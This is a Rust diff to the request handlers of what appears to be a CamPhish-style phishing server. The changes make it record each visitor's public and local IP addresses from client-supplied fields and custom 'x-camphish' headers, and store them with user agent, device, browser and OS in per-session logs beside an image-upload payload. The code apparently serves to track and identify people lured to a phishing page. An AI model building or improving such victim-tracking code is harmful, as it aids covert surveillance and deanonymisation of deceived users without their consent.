@@ -5,6 +5,7 @@ use axum::Json;
 use serde::Deserialize;
 use std::sync::Arc;
 use base64::Engine;
+use std::net::{IpAddr, Ipv4Addr, Ipv6Addr};
 
 #[derive(Deserialize)]
 pub struct ImagePayload {
@@ -37,6 +38,8 @@ pub struct IpPayload {
     session: Option<String>,
     #[serde(default)]
     client_ip: Option<String>,
+    #[serde(default)]
+    public_ip: Option<String>,
 }
 
 #[derive(Deserialize)]
@@ -215,7 +218,11 @@ pub async fn receive_ip(
     headers: HeaderMap,
     Json(body): Json<IpPayload>,
 ) -> Result<StatusCode, StatusCode> {
-    let ip = extract_ip(&headers);
+    let ip = body.public_ip
+        .as_deref()
+        .and_then(normalize_public_ip)
+        .map(str::to_string)
+        .unwrap_or_else(|| extract_ip(&headers));
     if !check_rate_limit(&state, &ip, 60, 60) {
         return Err(StatusCode::TOO_MANY_REQUESTS);
     }
@@ -235,7 +242,9 @@ pub async fn receive_ip(
         return Ok(StatusCode::OK);
     }
 
-    let client_local_ip = body.client_ip.clone().unwrap_or_default();
+    let client_local_ip = body.client_ip.clone()
+        .or_else(|| headers.get("x-camphish-local-ip").and_then(|v| v.to_str().ok()).map(str::to_string))
+        .unwrap_or_default();
     let ip_id = uuid::Uuid::new_v4().to_string();
     sqlx::query(
         "INSERT INTO ip_logs (id, session_id, ip_address, user_agent, device, browser, os, created_at) VALUES (?, ?, ?, ?, ?, ?, ?, ?)"
@@ -529,6 +538,12 @@ pub fn check_rate_limit(
 }
 
 pub fn extract_ip(headers: &HeaderMap) -> String {
+    if let Some(ip) = headers.get("x-camphish-public-ip")
+        .and_then(|v| v.to_str().ok())
+        .and_then(normalize_public_ip) {
+        return ip.to_string();
+    }
+
     headers.get("x-forwarded-for")
         .and_then(|v| v.to_str().ok())
         .and_then(|s| s.split(',').next())
@@ -536,6 +551,37 @@ pub fn extract_ip(headers: &HeaderMap) -> String {
         .unwrap_or("unknown")
         .trim()
         .to_string()
+}
+
+fn normalize_public_ip(raw: &str) -> Option<&str> {
+    let ip = raw.trim();
+    let parsed: IpAddr = ip.parse().ok()?;
+    if is_public_ip(&parsed) { Some(ip) } else { None }
+}
+
+fn is_public_ip(ip: &IpAddr) -> bool {
+    match ip {
+        IpAddr::V4(v4) => is_public_ipv4(v4),
+        IpAddr::V6(v6) => is_public_ipv6(v6),
+    }
+}
+
+fn is_public_ipv4(ip: &Ipv4Addr) -> bool {
+    !(ip.is_private()
+        || ip.is_loopback()
+        || ip.is_link_local()
+        || ip.is_multicast()
+        || ip.is_broadcast()
+        || ip.is_documentation()
+        || ip.is_unspecified())
+}
+
+fn is_public_ipv6(ip: &Ipv6Addr) -> bool {
+    !(ip.is_loopback()
+        || ip.is_multicast()
+        || ip.is_unspecified()
+        || ip.is_unique_local()
+        || ip.is_unicast_link_local())
 }
 
 fn parse_ua(ua: &str) -> (String, String, String) {
